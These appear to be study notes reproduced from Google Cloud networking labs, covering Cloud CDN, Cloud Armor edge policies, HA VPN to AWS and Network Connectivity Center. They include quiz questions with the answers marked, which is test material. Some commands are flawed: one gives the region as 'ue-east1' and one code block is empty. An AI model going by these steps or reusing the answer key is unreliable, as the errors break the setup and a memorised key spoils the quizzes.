+After a couple minutes, query the load balancer for the object you uploaded. You will need the load balancer IP address and the name of the image.
+
+1. Run the following from CloudShell and replace the LOAD_BALANCER_IP with the IPv4 address of the load balancer:
+
+```
+curl -svo /dev/null http://LOAD_BALANCER_IP/google.png
+```
+
+
+
+**Note:** It might take up to 5 minutes to access the HTTP Load Balancer.
+
+**Output:**
+
+```
+student-cloudshell% curl -svo /dev/null http://34.98.81.123/google.png
+*   Trying 34.98.81.123...
+* TCP_NODELAY set
+* Connected to 34.98.81.123 (34.98.81.123) port 80 (#0)
+> GET /google.png HTTP/1.1
+> Host: YOUR_IP
+> User-Agent: curl/7.64.1
+> Accept: */*
+>
+< HTTP/1.1 200 OK
+< X-GUploader-UploadID: ADPycdtoILI76KVsvBvdVGvSfzaxys1m3zYqCepBrmJxAI48ni24cWCRIdNu-53PX3DS6iycxp6xwFbMpwtcHHZQUQmEBxAgng
+< Expires: Mon, 13 Dec 2021 22:58:26 GMT
+< Date: Mon, 13 Dec 2021 21:58:26 GMT
+< Cache-Control: public, max-age=3600
+< Last-Modified: Mon, 13 Dec 2021 21:45:57 GMT
+< ETag: "8f9327db2597fa57d2f42b4a6c5a9855"
+< x-goog-generation: 1639431957957903
+< x-goog-metageneration: 2
+< x-goog-stored-content-encoding: identity
+< x-goog-stored-content-length: 5969
+< Content-Type: image/png
+< x-goog-hash: crc32c=TeiHTA==
+< x-goog-hash: md5=j5Mn2yWX+lfS9CtKbFqYVQ==
+< x-goog-storage-class: STANDARD
+< Accept-Ranges: bytes
+< Content-Length: 5969
+< Server: UploadServer
+```
+
+1. Run a few queries with this command:
+
+```
+for i in `seq 1 50`; do curl http://LOAD_BALANCER_IP/google.png; done
+```
+
+
+
+##### Confirm content served by Cloud CDN
+
+- Validate that your content is being served from the CDN via CDN or Load Balancing Monitoring by navigating to **Network Services > Cloud CDN**.
+
+![Cloud CDN overview page, with one result populated](images/7UEDVoyLD6cXCvf7GPS11Wg9EXVz0WD57IqpPKT3ocM%3D.png)
+
+You should be able to get close to a 100% hit ratio.
+
+Click **Check my progress** to verify the objective.
+
+Create a Load Balancer
+
+
+
+Check my progress
+
+
+
+#### Task 3. Delete the object from Cloud Storage bucket
+
+Now that the cache is populated, delete the object from the bucket. This will reinfore that you are applying the policy to the cache and not the backend.
+
+1. In the **Navigation menu** (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)), click **Cloud Storage > Buckets > `Bucket Name`**.
+2. Select the object and delete it by clicking the **Delete** button at the top.
+3. Click **Delete** at the prompt.
+
+Click **Check my progress** to verify the objective.
+
+Delete the object from Cloud Storage bucket
+
+
+
+Check my progress
+
+
+
+#### Task 4. Create an edge security policy
+
+Cloud Armor policies are substantiated outside of the HTTP Load Balancer. Once the Cloud Armor policy is deployed, you can then associate it with one or more HTTP Load Balancer Backend Service or Bucket resources, referred to as a Target.
+
+1. In the **Navigation menu** (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)), click **View All Products > Network Security > Cloud Armor policies** and click **Create Policy**.
+
+1. Set the following values, leave all other values at their defaults and click **Next Step**:
+
+| Property            | Value (type value or select option as specified) |
+| :------------------ | :----------------------------------------------- |
+| Name                | edge-security-policy                             |
+| Policy type         | Edge security policy                             |
+| Default rule action | Deny                                             |
+
+1. In **Apply policy to targets** section, click **Add Target** and set the following values:
+
+| Property                | Value                                               |
+| :---------------------- | :-------------------------------------------------- |
+| Type 1                  | Backend bucket (external application load balancer) |
+| Backend Bucket target 1 | lb-backend-bucket                                   |
+
+1. Click **Done**.
+2. Click **Create Policy**.
+
+##### Validate Edge Security Policy
+
+Now that you've created an edge security policy in front of the back-end bucket, validate that it works as expected.
+
+###### Check the security policy
+
+After a few minutes have passed, you can check that the Cloud Armor policy is running.
+
+From the command line, run the following command, which gives you a 403:
+
+```
+curl -svo /dev/null http://LOAD_BALANCER_IP/google.png
+```
+
+
+
+A 403 error occurs when you do not have permission to accessing a web page or something on a web server.
+
+**Output:**
+
+```
+curl -svo /dev/null http://34.98.81.123/google.png
+*   Trying 34.98.81.123...
+* TCP_NODELAY set
+* Connected to 34.98.81.123 (34.98.81.123) port 80 (#0)
+> GET /google.png HTTP/1.1
+> Host: YOUR_IP
+> User-Agent: curl/7.64.1
+> Accept: */*
+>
+< HTTP/1.1 403 Forbidden
+< X-GUploader-UploadID: ADPycdtS6FtJOGIsiWYDrAAE8VFeQuNutcvbGoQe2t8EZxsuspVtmCjyiTv_P3CNktroHMOGFXkTCfG-Jj-rUO60ZGPpEbpqcw
+< Content-Type: application/xml; charset=UTF-8
+< Content-Length: 111
+< Date: Mon, 13 Dec 2021 23:09:35 GMT
+< Expires: Mon, 13 Dec 2021 23:09:35 GMT
+< Cache-Control: private, max-age=0
+< Server: UploadServer
+```
+
+###### Investigate the logs
+
+Next, you check the logs to see the enforced edge security policy.
+
+1. In the **Navigation menu** (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)), click **View All Products > Observability > Logging > Logs Explorer**.
+2. Enter the below snippet into the query box and click **Run Query**:
+
+```
+resource.type:(http_load_balancer) AND jsonPayload.@type="type.googleapis.com/google.cloud.loadbalancing.type.LoadBalancerLogEntry" AND severity>=WARNING
+```
+
+
+
+1. Note the `403 response` and the enforced security policy.
+
+![The Query page, which includes the highlighted 403 response message and its security policy](images/6oLMK5C%2FszEFTgZb1VOEtFb4z%2BQr%2FFb470LXgCZ5Y8c%3D.png)
+
+Click **Check my progress** to verify the objective.
+
+Create edge security policy for cloud Armor
+
+
+
+Check my progress
+
+
+
+##### Remove the security policy
+
+To prove that the object is getting delivered from the CDN cache, remove the Cloud Armor security policy and query the object. The origin object has been removed from Cloud Storage, thus illustrating that the object is getting served from the edge cache.
+
+1. In the **Navigation menu** (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D)), click **View All Products > Network Security > Cloud Armor policies > edge-security-policy > Targets**.
+2. Select the `lb-backend-bucket` target and click **Remove** to remove the target bucket. Confirm **Remove**.
+
+1. Wait a few minutes, then send another `curl` to the resource in the Cloud Storage bucket:
+
+```
+curl -svo /dev/null http://LOAD_BALANCER_IP/google.png
+```
+
+
+
+You get a `200` response this time. The web page is acting as it is supposed to.
+
+**Output:**
+
+```
+student-cloudshell% curl -svo /dev/null http://34.98.81.123/google.png
+
+ Trying 34.98.81.123...
+ TCP_NODELAY set
+ Connected to 34.98.81.123 (34.98.81.123) port 80 (#0)
+ GET /google.png HTTP/1.1
+ Host: YOUR_IP
+ User-Agent: curl/7.64.1
+ Accept: */*
+
+  HTTP/1.1 200 OK
+  X-GUploader-UploadID: ADPycdtI7f49P3MSuZSZ8vl6RwfwmnIDJ59EeSKp7UPvLPawdaiRHXiNWLtseQTxUxceWOvSLvpYmT3pWVkV4qeIP7M
+  Date: Mon, 13 Dec 2021 23:06:46 GMT
+  Last-Modified: Mon, 13 Dec 2021 21:45:57 GMT
+  ETag: "8f9327db2597fa57d2f42b4a6c5a9855"
+  x-goog-generation: 1639431957957903
+  x-goog-metageneration: 2
+  x-goog-stored-content-encoding: identity
+  x-goog-stored-content-length: 5969
+  Content-Type: image/png
+  x-goog-hash: crc32c=TeiHTA==
+  x-goog-hash: md5=j5Mn2yWX+lfS9CtKbFqYVQ==
+  x-goog-storage-class: STANDARD
+  Accept-Ranges: bytes
+  Content-Length: 5969
+  Server: UploadServer
+  Age: 1621
+  Cache-Control: public,max-age=3600
+ { [775 bytes data]
+ Connection #0 to host 34.98.81.123 left intact
+ Closing connection 0
+```
+
+Try it a couple of times and see if you get a 403 status code.
+
+#### Congratulations!
+
+You have successfully created a Cloud Storage bucket, uploaded an image to it, bound it to a load balancer, and then enabled Cloud CDN and edge security policies on it.
+
+
+
+### Quiz
+
+1. CDN Interconnect provides:
+
+- A direct connection between your origin servers and Google's Cloud Load Balancing service.
+- A private connection between your on-premises network and Google Cloud.
+- **A direct peering connection between third-party content delivery networks (CDNs) and Google's edge network.**
+- A virtual private network (VPN) tunnel between your VPC network and Google's global network.
+
+Correct. CDN Interconnect facilitates direct peering between CDNs and Google's edge, improving content delivery.
+
+2. When you use the internal IP address of the forwarding rule to specify an internal Network Load Balancer next hop, the load balancer can only be:
+
+- **In the same VPC network as the next hop route or in a peered VPC network.**
+- In the same VPC network as the next hop route.
+- In the same subnet as the next hop route.
+- In the same subnet as the next hop route or a shared VPC network.
+
+This is correct. When using an internal IP address of the forwarding  rule, the Network Load Balancer can be located either in the same VPC  network as the next hop route or in a VPC network that is peered with  it.
+
+3. Which of the following best practices help optimize load balancing cost?
+
+- Ignoring load balancer health checks to avoid additional API calls.
+- **Implementing a caching layer with a content delivery network (CDN).**
+- Selecting the most expensive load balancer type for maximum performance.
+- Overprovisioning load balancer resources to handle peak traffic loads.
+
+Correct. CDNs can offload traffic from your origin servers, reducing the load on your load balancer and potentially allowing you to use a  smaller, less expensive option
+
+
+
+# Networking in Google Cloud: Hybrid and Multicloud
+
+## Connectivity Options
+
+### Quiz
+
+1. Your company is located in a city where Google Cloud does not have a Dedicated Interconnect location, but you need a private connection to your Google Cloud Virtual Private Cloud (VPC). Which Cloud Interconnect option is most suitable for this scenario?
+
+- Dedicated Interconnect
+- **Partner Interconnect**
+- Carrier Peering
+- Network Connectivity Center
+
+This is correct. Partner Interconnect allows you to connect to Google's network through a supported service provider's facilities, even if there isn't a Dedicated Interconnect location in your city. This gives you a private connection to your VPC.
+
+2. Which Google Cloud Interconnect option requires the customer to provide their own routing equipment and establish a Border Gateway Protocol (BGP) session with Google's edge network?
+
+- **Dedicated Interconnect**
+- Network Connectivity Center
+- Partner Interconnect
+- Cross-Cloud Interconnect
+
+Correct. Dedicated Interconnect requires customers to establish a direct physical connection to Google's network at a colocation facility.
+
+
+
+## Cloud VPN
+
+### LAB - Create Highly Available VPN Connections between Google Cloud and AWS
+
+
+
+#### PTPPF058
+
+This lab is a part of the upcoming Partner Technical Presales Proficiency Framework (PTPPF) Program. This lab is intended for all technical Googlers and Partners. This lab is not intended for public consumption beyond this audience.
+
+**Scoring:** You must score **80% or higher** to pass this PTPPF Challenge lab.
+
+#### Challenge lab overview
+
+This lab challenges you to perform actions and automation across products. Instead of following step-by-step instructions, you are given a common business scenario and a set of tasks – you then figure out how to complete them on your own, using your skills to come up with a solution that demonstrates your understanding of key concepts. An automated scoring system provides feedback on whether you have completed your tasks correctly. Are you up for the challenge?
+
+#### Objective
+
+This lab challenges you to demonstrate your ability to create highly available virtual private network (VPN) connections between Google Cloud and Amazon Web Services (AWS) for direct communication between virtual private cloud (VPC) networks across the two cloud platforms.
+
+#### Setup and requirements
+
+#### Log into AWS
+
+Click the AWS Console link to log in to the AWS Management Console.
+
+#### Log into Google Cloud
+
+#### Before you click the Start Lab button
+
+Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click **Start Lab**, shows how long Google Cloud resources will be made available to you.
+
+This Qwiklabs hands-on lab lets you do the lab activities yourself in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials that you use to sign in and access Google Cloud for the duration of the lab.
+
+#### What you need
+
+To complete this lab, you need:
+
+- Access to a standard internet browser (Chrome browser recommended).
+- Time to complete the lab.
+
+**Note:** If you already have your own personal Google Cloud account or project, do not use it for this lab.
+
+**Note:** If you are using a Pixelbook, open an Incognito window to run this lab.
+
+#### How to start your lab and sign in to the Google Cloud Console
+
+1. Click the **Start Lab** button. If you need to pay for the lab, a pop-up opens for you to select your payment method. On the left is a panel populated with the temporary credentials that you must use for this lab.
+
+ ![Open Google Console](https://cdn.qwiklabs.com/%2FtHp4GI5VSDyTtdqi3qDFtevuY014F88%2BFow%2FadnRgE%3D)
+
+2. Copy the username, and then click **Open Google Console**. The lab spins up resources, and then opens another tab that shows the **Sign in** page.
+
+ ![Sign in](https://cdn.qwiklabs.com/VkUIAFY2xX3zoHgmWqYKccRLwFrR4BfARLd5ojmlbhs%3D)
+
+ ***Tip:\*** Open the tabs in separate windows, side-by-side.
+
+ If you see the **Choose an account** page, click **Use Another Account**.
+
+  ![Choose an account](https://cdn.qwiklabs.com/eQ6xPnPn13GjiJP3RWlHWwiMjhooHxTNvzfg1AL2WPw%3D)
+
+3. In the **Sign in** page, paste the username that you copied from the Connection Details panel. Then copy and paste the password.
+
+***Important:\*** You must use the credentials from the Connection Details panel. Do not use your Qwiklabs credentials. If you have your own Google Cloud account, do not use it for this lab (avoids incurring charges).
+
+4. Click through the subsequent pages:
+
+- Accept the terms and conditions.
+- Do not add recovery options or two-factor authentication (because this is a temporary account).
+- Do not sign up for free trials.
+
+After a few moments, the Cloud Console opens in this tab.
+
+**Note:** You can view the menu with a list of Google Cloud Products and Services by clicking the **Navigation menu** at the top-left. ![Cloud Console Menu](https://cdn.qwiklabs.com/oh1qwpHJqNk7NlbvLzIKjm2piwL%2FZ0tmduo8Yh46RFc%3D)
+
+#### Challenge scenario
+
+Headquartered in Minneapolis, Minnesota, Cymbal currently employs 775,000 people across the world and reported 192 billion US dollars in revenue in 2019.
+
+Cymbal has always been strongly committed to innovation, uncovering meaningful ways to transform industries and deliver better experiences for its customers. Cymbal’s branded businesses span multiple sectors including manufacturing, financial services, media, healthcare, retail, aviation, and education.
+
+Cymbal Group has been rapidly making the transition to a cloud-first operating model. Cymbal Bank, Superstore, and other Cymbal Group assets have all been adopting Google Cloud as part of their technology strategy. Recognizing the need for a multi-cloud architecture, the CIO of Cymbal Group has mandated a standard architecture for all new services, sharing a common network foundation that is based on Google Cloud and AWS.
+
+#### Your challenge
+
+As a network architect employed at Cymbal Group, you have been asked to create highly available VPN connections between Google Cloud and Amazon Web Services (AWS) for direct communication between VPC networks across the two cloud platforms.
+
+#### Task 1. Create the highly available VPN gateway and configure Cloud Router on Google Cloud
+
+Create a VPC network, a highly available VPN gateway, and configure the Cloud Router service on Google Cloud.
+
+1. Create a custom VPC network `cymbal-cloud-vpc` with a single subnet `cymbal-cloud-subnet` in the `us-east1` region.
+
+   ```
+   gcloud compute networks create cymbal-cloud-vpc \
+       --subnet-mode custom \
+       --bgp-routing-mode global
+   ```
+
+   ```
+   gcloud compute networks subnets create cymbal-cloud-subnet \
+       --network cymbal-cloud-vpc \
+       --region us-east1 \
+       --range 10.1.1.0/24
+   ```
+
+2. Create the highly available VPN gateway `cymbal-cloud-ha-vpn-gw` in the network `cymbal-cloud-vpc`.
+
+   ```
+   gcloud compute vpn-gateways create cymbal-cloud-ha-vpn-gw \
+       --network cymbal-cloud-vpc \
+       --region ue-east1
+   ```
+   
+3. Create a Cloud Router service asset named `cymbal-cloud-router` in the `us-east1` region.
+
+   ```
+```
+
+
+
+Create the highly available VPN gateway and configure Cloud Router on Google Cloud
+
+
+
+Check my progress
+
+#### Task 2. Create gateways and VPN connections on AWS
+
+Create customer gateways, a target gateway, and VPN connections with dynamic routing.
+
+1. Configure the AWS command-line interface (CLI).
+   - Connect to the Google Compute Engine virtual machine (VM) named `lab-setup` via SSH.
+   - Type `aws configure`.
+   - Follow the steps and enter the AWS Access Key ID and AWS Secret Access Key displayed in the lab user information panel.
+   - For the region, select **us-east-1**.
+2. Create two customer gateways.
+3. Create a **virtual private gateway** as a target gateway and attach it to to your pre-created VPC network `CymbalAdVpc` on AWS side.
+4. Create two VPN connections with dynamic routing.
+
+Create gateways and VPN connections on AWS
+
+
+
+Check my progress
+
+#### Task 3. Create VPN tunnels and Cloud Router interfaces on Google Cloud
+
+Use the information from the AWS VPN connections that you created in the previous tasks to create and configure components on Google Cloud.
+
+1. Create an external VPN gateway with four interfaces for the AWS externally-facing IP addresses.
+2. Create four VPN tunnels.
+3. Create four interfaces to Cloud Router.
+4. Add border gateway protocol (BGP) peers.
+
+Create VPN tunnels and Cloud Router interfaces on Google Cloud
+
+
+
+Check my progress
+
+#### Task 4. Verify the configuration
+
+Verify the router and tunnel configuration.
+
+Check the tunnel status using the following code:
+
+```
+GET_TUNNEL_1=$(gcloud compute vpn-tunnels list --format='value[](NAME)'|head -1) && \
+  gcloud compute vpn-tunnels describe $GET_TUNNEL_1 \
+       --region us-east1 \
+       --format='flattened(status,detailedStatus)'
+```
+
+
+
+You should receive a status of **ESTABLISHED**.
+
+Verify the configuration
+
+
+
+Check my progress
+
+#### Congratulations!
+
+You have successfully created highly available VPN connections between Google Cloud and Amazon Web Services.
+
+
+
+### LAB - Configuring Network Connectivity Center as a Transit Hub
+
+#### Overview
+
+Network Connectivity Center (NCC) enables connecting different enterprise networks together that are outside of Google Cloud by leveraging Google's network—providing enterprises instant access to planet-scale reach and high reliability. Traffic between non-Google networks is referred to as data transfer traffic, which can occur using existing standard cloud network connectivity resources such as Cloud VPN, Dedicated or Partner Interconnect.
+
+In this lab, you will go through the process of setting up NCC as a transit hub to route traffic between two non-Google networks using Google's backbone network.
+
+#### Architecture
+
+NCC consists of hub and spoke resources.
+
+**Hub**
+
+A hub is a global Google Cloud resource that supports multiple attached spokes. It provides a simple way to connect spokes together to enable data transfer across them. A hub can provide data transfer between different on-premises locations and a Virtual Private Cloud (VPC) network through its attached spokes.
+
+**Spoke**
+
+A spoke is a Google Cloud network resource connected to a hub. It is part of the hub, and can't be created without creating the hub first. A spoke routes traffic to remote network address blocks and enables the connection of multiple remote networks.
+
+Spokes can be of one of the following types:
+
+- HA VPN tunnels
+- VLAN attachments
+- Router appliance instances that you or select partners deploy within Google Cloud
+
+The following network topology is similar to a typical customer deployment having branch offices located in two geographically separate locations. For this lab, you are simulating two VPCs *vpc-a*, and *vpc-b* in `Region 1`, and `Region 2` as the branch offices respectively.
+
+The branch offices are connected to a VPC, *vpc-transit*, which is a central hub terminating a pair of HA VPNs. These VPNs are configured in a region closest to the branch offices. In the real world, these VPNs could be replaced using Interconnects.
+
+You will configure the NCC hub in the *vpc-transit* network, and the two remote branch offices will be connected using the HA VPN tunnels as spokes.
+
+![Network topology project example](images/9k3iu618o9ppsU1nO%2FJRRX17rCFJCu%2BMp33J%2FtJ1C9o%3D.png)
+
+In this lab, you will achieve the following objectives:
+
+1. Create a hub VPC called *vpc-transit*.
+2. Create two remote branch office VPCs namely *vpc-a* and *vpc-b*.
+3. Create HA VPN from *vpa-a* to *vpc-transit*, and *vpc-b* to *vpc-transit*.
+4. Create a NCC hub resource and attach the HA VPNs as spokes.
+5. Test the setup end to end deploying VMs in the remote branch office VPCs.
+
+#### Prerequisites
+
+- Basic knowledge of Google VPC Networking, and Compute Engine.
+- It is helpful to have completed the [Networking 101](https://google.qwiklabs.com/catalog_lab/311) and [VPC Networking: Cloud HA-VPN](https://www.qwiklabs.com/focuses/6270?parent=catalog) labs.
+
+#### Task 1. Create vpc-transit
+
+1. In the Google Cloud Console, in the top-right toolbar, click the **Activate Cloud Shell** button and run the following command to delete the **default** network.
+
+![Cloud Shell icon](images/vdY5e%2Fan9ZGXw5a%2FZMb1agpXhRGozsOadHURcR8thAQ%3D.png)
+
+```
+gcloud compute networks delete default
+```
+
+
+
+1. In the Google Cloud Console, from the **Navigation Menu (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D))**, go to **VPC network**.
+2. Click **CREATE VPC NETWORK**.
+3. Enter a Name for the network: **vpc-transit**.
+4. You do not need to create a subnet for the *vpc-transit* so click **Delete** next to New Subnet.
+5. Choose the Dynamic routing mode for the VPC network as **Global**.
+
+**Note:** Learn more about dynamic routing from the [dynamic routing mode documentation](https://cloud.google.com/vpc/docs/vpc#routing_for_hybrid_networks).
+
+1. Click **Create**.
+
+Click *Check my progress* to verify the objective.
+
+Create vpc-transit network
+
+
+
+Check my progress
+
+
+
+#### Task 2. Create remote branch office VPCs
+
+1. In the Google Cloud Console, from the **Navigation menu**, go to the **VPC network**.
+2. Click **CREATE VPC NETWORK**.
+3. Enter a Name for the network as **vpc-a**.
+4. Choose **Custom** for the Subnet creation mode.
+5. In the New subnet section, specify the following configuration parameters for a subnet:
+   - Name for the subnet: **vpc-a-sub1-use4**.
+   - Region: **`Region 1`**.
+   - IP address range **10.20.10.0/24**. This is the primary IP range for the subnet.
+6. Click **Done**.
+7. Choose the Dynamic routing mode for the VPC network as **Regional**.
+8. Click **Create**.
+9. To add the second remote branch office VPC, click **CREATE VPC NETWORK**.
+10. Enter a Name for the network as **vpc-b**.
+11. Choose **Custom** for the Subnet creation mode.
+12. In the New subnet section, specify the following configuration parameters for a subnet:
+13. Provide a Name for the subnet as **vpc-b-sub1-usw2**.
+14. Select Region as **`Region 2`**.
+15. Enter an IP address range **10.20.20.0/24**.
+16. Click **Done**.
+17. Choose the Dynamic routing mode for the VPC network as **Regional**.
+18. Click **Create**.
+
+Now you should be able to view all 3 VPCs in the VPC networks console like this:
+
+![VPC networks console displaying VPCs](images/Pb5gdQp%2B93LD4uC3K0KTB6v1mhwNz5Rst6YH1k5UTzc%3D.png)
+
+Click *Check my progress* to verify the objective.
+
+Create remote branch office VPCs namely vpc-a and vpc-b
+
+
+
+Check my progress
+
+
+
+#### Task 3. Configure HA VPN between the remote branch office VPCs and the transit hub VPC
+
+**Note:** In this lab you are simulating the remote branch offices as Google Cloud VPCs, therefore using the steps listed to [Create HA VPN between Google Cloud Networks](https://cloud.google.com/network-connectivity/docs/vpn/how-to/creating-ha-vpn2).
+
+
+
+For any practical implementation, you may replace the steps listed below with the steps for [Creating an HA VPN gateway to a peer VPN gateway](https://cloud.google.com/network-connectivity/docs/vpn/how-to/creating-ha-vpn) if you are using HA VPNs to connect to your branch offices.
+
+In this section you will configure an HA VPN between the remote branch office VPCs (*vpc-a* and *vpc-b*) and the transit hub VPC (*vpc-transit*). HA VPN uses BGP for dynamically exchanging routes between Google Cloud and the peer network. Before configuring the HA VPNs, you need to create Cloud Routers associated with each VPC network.
+
+**Note:** Learn more about Cloud Routers [in the Cloud Router overview documentation](https://cloud.google.com/network-connectivity/docs/router/concepts/overview).
+
+##### **Step 1: Create cloud routers**
+
+To create a new Cloud Router for each VPC, specify the following:
+
+1. In the Cloud Console, from the **Navigation menu**, go to **Network Connectivity** and select **Cloud Routers**.
+2. Click **Create router**.
+3. Enter name as **cr-vpc-transit-use4-1**.
+4. Select the network as **vpc-transit**.
+5. Select the region as **`Region 1`**.
+6. Enter the **ASN** as **65000**.
+7. Select **Advertise all subnets visible to the Cloud Router (Default)**.
+8. Click **Create**.
+9. Use the steps mentioned above to create additional cloud routers using the following details:
+
+| **Cloud Router name**   | **VPC Network** | **Region** | **Google ASN** |
+| ----------------------- | --------------- | ---------- | -------------- |
+| *cr-vpc-transit-usw2-1* | vpc-transit     | `Region 2` | 65000          |
+| *cr-vpc-a-use4-1*       | vpc-a           | `Region 1` | 65001          |
+| *cr-vpc-b-usw2-1*       | vpc-b           | `Region 2` | 65002          |
+
+##### **Step 2: Create HA VPN gateways**
+
+Create an HA VPN gateway in the *vpc-transit* network for `Region 1` region, using the following steps:
+
+1. From the **Navigation menu**, go to **Network Connectivity** and select **VPN**.
+2. Click **Create VPN connection**.
+3. Select **High-availability (HA) VPN**.
+4. Click **Continue**.
+5. Specify a VPN gateway name as **vpc-transit-gw1-use4**.
+6. Under the VPC network, select **vpc-transit**.
+7. Select a Region as **`Region 1`**.
+8. Click **Create and continue**.
+
+**Note:** Before adding VPN tunnels, you need to create additional VPN gateways.
+
+1. From the VPN page, select **Cloud VPN Gateways**.
+2. Click **Create VPN gateway** and enter the following details to create the additional VPN gateways:
+
+| **VPN gateway name**   | **VPC Network** | **Region** |
+| ---------------------- | --------------- | ---------- |
+| *vpc-transit-gw1-usw2* | vpc-transit     | `Region 2` |
+| *vpc-a-gw1-use4*       | vpc-a           | `Region 1` |
+| *vpc-b-gw1-usw2*       | vpc-b           | `Region 2` |
+
+Click *Check my progress* to verify the objective.
+
+Create cloud routers and HA VPN gateways
+
+
+
+Check my progress
+
+
+
+##### **Step 3: Create a pair of VPN tunnels between vpc-transit to vpc-a**
+
+###### Add VPN tunnels from vpc-transit to vpc-a
+
+Create a pair of VPN tunnels using the following steps:
+
+1. From the VPN page, click on **Cloud VPN Gateways** and select **vpc-transit-gw1-use4**.
+2. Click to **Add VPN tunnel**.
+3. For the Peer VPN Gateway, select **Google Cloud VPN Gateways**.
+4. Select the **Project Id** associated with the lab.
+5. Select the remote VPN gateway, **vpc-a-gw1-use4**.
+6. For high availability, select **Create a pair of VPN tunnels**.
+7. Select the Cloud Router **cr-vpc-transit-use4-1**.
+8. Click on the VPN tunnel to enter the tunnel details:
+   - The Cloud VPN and the associated peer VPN gateway interface information should be pre-populated
+   - Name: **transit-to-vpc-a-tu1**
+   - IKE version: IKEv2
+   - IKE pre-shared key: **gcprocks**
+9. Click **Done**.
+10. Repeat steps for the second tunnel:
+    - Name: **transit-to-vpc-a-tu2**
+    - IKE version: IKEv2
+    - IKE pre-shared key: **gcprocks**
+11. Click **Done**.
+12. Click **Create & Continue**.
+
+###### Add BGP sessions for each VPN tunnel configured from vpc-transit to vpc-a
+
+The next step is to configure BGP session for the VPN tunnel *transit-to-vpc-a-tu1*
+
+1. Click
+
+    
+
+   Configure BGP Session for transit-to-vpc-a-tu1
+
+   :
+
+   - BGP session name: **transit-to-vpc-a-bgp1**
+   - Peer ASN: **65001**
+   - Allocate BGP IPv4 address: *Manually*
+   - Cloud Router BGP IPv4 address: **169.254.1.1**
+   - BGP peer IPv4 address: **169.254.1.2**
+
+2. Click **Save and continue**.
+
+- Repeat steps to configure BGP session for the VPN tunnel *transit-to-vpc-a-tu2*.
+
+1. Click **Configure BGP Session for transit-to-vpc-a-tu2**:
+
+- BGP session name: **transit-to-vpc-a-bgp2**
+- Peer ASN: **65001**
+- Allocate BGP IPv4 address: *Manually*
+- Cloud Router BGP IPv4 address: **169.254.1.5**
+- BGP peer IPv4 address: **169.254.1.6**
+
+1. Click **Save and continue**.
+2. Click on **Save BGP configuration**.
+3. Click **OK**.
+
+###### Add VPN tunnels from vpc-a to vpc-transit
+
+Now create a pair of VPN tunnels from the *vpc-a* to *vpc-transit* to complete the bidirectional tunnel configuration using the following steps:
+
+1. From the VPN page, select **Cloud VPN Gateways** *vpc-a-gw1-use4*:
+2. Click to **Add VPN tunnel**.
+3. For the Peer VPN Gateway, select **Google Cloud VPN Gateways**.
+4. Select the **Project Id** associated with the lab.
+5. Select the remote VPN gateway, **vpc-transit-gw1-use4**
+6. For high availability, select **Create a pair of VPN tunnels**.
+7. Select the Cloud Router, **cr-vpc-a-use4-1**
+8. Click on the VPN tunnel to enter the tunnel details:
+   - The Cloud VPN and peer VPN gateway interface information should be pre-populated.
+   - Name: **vpc-a-to-transit-tu1**
+   - IKE version: IKEv2
+   - IKE pre-shared key: **gcprocks**
+9. Click **Done**.
+10. Repeat steps for the second tunnel:
+    - Name: **vpc-a-to-transit-tu2**
+    - IKE version: IKEv2
+    - IKE pre-shared key: **gcprocks**
+11. Click **Done**.
+12. Click **Create & Continue**.
+
+###### Add BGP sessions for each VPN tunnel configured from vpc-a to vpc-transit
+
+The next step is to configure BGP session for the VPN tunnel: *transit-to-vpc-a-tu1*
+
+1. Click
+
+    
+
+   Configure BGP Session for vpc-a-to-transit-tu1
+
+   - BGP session name: **vpc-a-to-transit-bgp1**
+   - Peer ASN: **65000**
+   - Allocate BGP IPv4 address: *Manually*
+   - Cloud Router BGP IPv4 address: **169.254.1.2**
+   - BGP peer IPv4 address: **169.254.1.1**
+
+2. Click **Save and continue**.
+
+Repeat steps to configure BGP session for the VPN tunnel: *transit-to-vpc-a-tu2*
+
+1. Click
+
+    
+
+   Configure BGP Session for vpc-a-to-transit-tu2
+
+   - BGP session name: **vpc-a-to-transit-bgp2**
+   - Peer ASN: **65000**
+   - Allocate BGP IPv4 address: *Manually*
+   - Cloud Router BGP IPv4 address: **169.254.1.6**
+   - BGP peer IPv4 address: **169.254.1.5**
+
+2. Click **Save and continue**.
+
+3. Click on **Save BGP configuration**.
+
+4. Click **OK**.
+
+Once this step is complete the VPN tunnel status should reflect *Established* and BGP status should reflect *BGP established*.
+
+##### **Step 4: Create a pair of VPN tunnels between vpc-transit to vpc-b**
+
+- Repeat steps listed above (step 3) to create the bidirectional HA VPN tunnels between the vpc-transit and vpc-b networks using the details below.
+
+###### Add VPN tunnels from vpc-transit to vpc-b
+
+| Peer VPN gateway name | *vpc-b-gw1-usw2*        |
+| --------------------- | ----------------------- |
+| Cloud Router          | *cr-vpc-transit-usw2-1* |
+| VPN tunnel one        | *transit-to-vpc-b-tu1*  |
+| Pre-shared key        | *gcprocks*              |
+| VPN tunnel two        | *transit-to-vpc-b-tu2*  |
+| Pre-shared key        | *gcprocks*              |
+
+###### Add BGP sessions for each VPN tunnel configured from vpc-transit to vpc-b
+
+BGP session for tunnel *transit-to-vpc-b-tu1* :
+
+| BGP session                   | *transit-to-vpc-b-bgp1* |
+| ----------------------------- | ----------------------- |
+| Peer ASN                      | *65002*                 |
+| Cloud Router BGP IPv4 address | 169.254.1.9             |
+| BGP peer IPv4 address         | 169.254.1.10            |
+
+BGP session for tunnel *transit-to-vpc-b-tu2* :
+
+| BGP session                   | *transit-to-vpc-b-bgp2* |
+| ----------------------------- | ----------------------- |
+| Peer ASN                      | *65002*                 |
+| Cloud Router BGP IPv4 address | 169.254.1.13            |
+| BGP peer IPv4 address         | 169.254.1.14            |
+
+###### Add VPN tunnels from vpc-b to vpc-transit
+
+| Peer VPN gateway name | *vpc-transit-gw1-usw2* |
+| --------------------- | ---------------------- |
